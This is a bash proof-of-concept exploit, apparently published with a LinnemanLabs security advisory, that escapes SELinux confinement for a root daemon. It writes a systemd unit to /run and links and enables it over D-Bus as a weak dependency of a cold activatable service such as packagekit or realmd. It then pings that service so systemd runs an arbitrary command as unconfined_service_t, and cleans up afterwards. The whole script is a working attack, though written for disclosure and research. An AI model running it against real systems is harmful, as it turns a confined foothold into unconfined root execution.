#!/bin/bash
#
# LinnemanLabs - systemd activation-pull PoC - want. link enable.
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# confined uid-0 daemon with zero service-start permissions can create a systemd unit
# with "WantedBy=" in it, causing a target daemon to have a weak dependency on it.
# if that service has not been loaded yet its dependencies are not cached yet.
#
# we activate the service by calling its D-Bus name, causing systemd to start the service.
# which pulls in our dependency and starts our service.
#
# you must use a cold service that has not been loaded yet. many services de-activate when
# idle, and systemd GC unloads them, making them a valid target again. run_id is added
# to the service name otherwise the prior PoC service (including ExecStart) is cached.
#
# to enumerate reachable services use ./cold-activatable-services.sh <confined_domain>
# set UNIT_PATH= env var to a writable location from the confined domain.
# set CMD= env var to command to run.
#
UNIT_PATH=${UNIT_PATH:-/run}

set -eu
RUN_ID="$( date +%s )$$"
UNIT="${UNIT_PATH}/linnemanlabs-poc-${RUN_ID}.service"
SD="org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager"
DEFAULT_CMD='{ id; grep ^Cap /proc/self/status; } > /tmp/service.out-'"${RUN_ID}"
CMD=${CMD:-$DEFAULT_CMD}
# confirm pivot service is cold before proceeding
is_cold(){ busctl call $SD GetUnit s "$1" 2>&1 | grep -q 'not loaded'; }

# services to pivot through - (dbus-name, unit) pairs come from cold-activatable-pivots.sh, baking a few in:
for pair in "org.freedesktop.Passim passim.service" \
            "org.freedesktop.portable1 dbus-org.freedesktop.portable1.service" \
            "org.freedesktop.sysupdate1 dbus-org.freedesktop.sysupdate1.service" \
            "org.freedesktop.thermald dbus-org.freedesktop.thermald.service" \
            "org.freedesktop.intel_lpmd org.freedesktop.intel_lpmd.service" \
            "org.freedesktop.PackageKit packagekit.service" \
            "org.freedesktop.realmd realmd.service"; do
  set -- $pair
  if is_cold "$2"; then PIVOT_NAME="$1"; PIVOT_UNIT="$2"; break; fi
done
if [ -z "${PIVOT_UNIT:-}" ];then
  echo "[-] no cold pivot found in base list. run cold-activatable-pivots.sh and add some new ones"
  exit 1
else
  echo "[*] cold pivot for WantedBy chose ${PIVOT_UNIT}"
fi

# create a unit whose ExecStart is bin_t (init_t + bin_t -> unconfined_service_t), wanted by the pivot
echo "[*] writing unit to ${UNIT}"
cat > "${UNIT}" <<EOF
[Unit]
Description=LinnemanLabs PoC

[Service]
Type=oneshot
ExecStart=/usr/bin/env sh -c '${CMD}'

[Install]
WantedBy=${PIVOT_UNIT}
EOF

# Link turns our /run file into a known unit - no daemon-reload needed
echo "[*] linking ${UNIT} to create known unit"
busctl call ${SD} LinkUnitFiles asbb 1 "${UNIT}" false true
echo "[+] linked ${UNIT}"

# Enable wires it into the cold pivot's .wants (pivot not loaded yet, so still no reload)
echo "[*] enabling unit to create .wants link"
busctl call ${SD} EnableUnitFiles asbb 1 "${UNIT}" false true
echo "[+] enabled - ${PIVOT_UNIT} now weakly depends on us"

# ping the cold service to activate it, systemd fresh-loads it, reads our .wants, pulls our unit as weak dependency
echo "[*] pinging ${PIVOT_NAME} to activate our dependency"
busctl call "${PIVOT_NAME}" / org.freedesktop.DBus.Peer Ping || true
echo "[+] activated ${PIVOT_NAME} - check /tmp/service.out-${RUN_ID}"

# Unlink our service,
echo "[*] cleaning up - unlinking our service and deleting unit file"
busctl call ${SD} DisableUnitFiles asb 1 "$( basename "${UNIT}" )" false
rm -f "${UNIT}"
echo "[+] cleanup done. systemd caches the Wants= until next daemon-reload"
echo "[*] to remove now: sudo systemctl daemon-reload"
echo "[*] if svc running: sudo systemctl stop ${PIVOT_UNIT}"

exit 0
